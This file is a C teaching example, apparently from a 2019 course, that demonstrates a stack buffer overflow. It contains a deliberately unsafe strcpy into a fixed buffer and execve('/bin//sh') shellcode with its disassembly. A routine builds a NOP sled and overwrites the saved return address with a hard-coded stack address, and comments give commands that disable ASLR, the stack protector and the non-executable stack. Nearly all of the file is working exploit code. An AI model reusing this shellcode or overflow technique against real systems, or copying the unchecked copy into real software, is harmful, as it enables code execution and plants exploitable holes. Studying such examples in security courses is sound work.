/** ==================================================================== */
/* This example demonstrates the buffer overflow error.                  */
/* Fanping Zeng.  04/08/2019      buffer_overflow.c                      */
/* ===================================================================== */
// gcc -fno-stack-protector -o buf attack_overflow.c
// sudo sysctl -w kernel.randomize_va_space=0
// gcc -fno-stack-protector -z execstack -o buf attack_overflow.c
  
#include <stdio.h>
#include <string.h>

// Define a large buffer with 32 bytes.
char Lbuffer[] = "01234567890123456789========ABCD";  //32Byte
// Define a large buffer with ATTACK_BUFF_LEN bytes.
#define ATTACK_BUFF_LEN 1024
char attackStr[ATTACK_BUFF_LEN];

void foo()
{
    char buff[163];
    strcpy (buff, attackStr);
}

char shellcode[] = 
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

/*
08048400 <foo>:
 8048400:	55                   	push   %ebp
 8048401:	89 e5                	mov    %esp,%ebp

 8048403:	31 d2                	xor    %edx,%edx
 8048405:	52                   	push   %edx
 8048406:	68 6e 2f 73 68       	push   $0x68732f6e
 804840b:	68 2f 2f 62 69       	push   $0x69622f2f
 8048410:	89 e3                	mov    %esp,%ebx
 8048412:	52                   	push   %edx
 8048413:	53                   	push   %ebx
 8048414:	89 e1                	mov    %esp,%ecx
 8048416:	8d 42 0b             	lea    0xb(%edx),%eax
 8048419:	0f 34                	sysenter 
            cd 80                   int    %0x80
 804841b:	5d                   	pop    %ebp
 804841c:	c3                   	ret    
*/

void run_shellcode(void)
{
    strcpy(attackStr, shellcode);
    ((void (*)())attackStr)();
}

void justCopyTheLbuffer()
{
    strcpy(attackStr, Lbuffer);
}

#define SMALL_BUFFER_START 0xbfffef00
#define OffSet 256

void SmashSmallBuf()
{
    unsigned long *ps;
    memset(attackStr, 0x90, ATTACK_BUFF_LEN);
    strcpy(attackStr + (ATTACK_BUFF_LEN - strlen(shellcode) - 1), shellcode);
    ps = (unsigned long *)(attackStr+OffSet);   // The position to save the return address.
    *(ps) = SMALL_BUFFER_START + 0x100; // change the return address to our shellcode.
    attackStr[ATTACK_BUFF_LEN-1] = 0;
}

/* ===================================================================== */
/* Main                                                                  */
/* ===================================================================== */
/*   argc, argv are the entire command line.                             */
/* ===================================================================== */

int main(int argc, char * argv[])
{
    // You should arrange the attack string here.
    justCopyTheLbuffer();

    // Insert the shellcode to the attackStr.
    SmashSmallBuf();

    // Call the vulnerable function.
    foo();

    // Run the shellcode, see whether it works.
    run_shellcode();
    return 0;
}
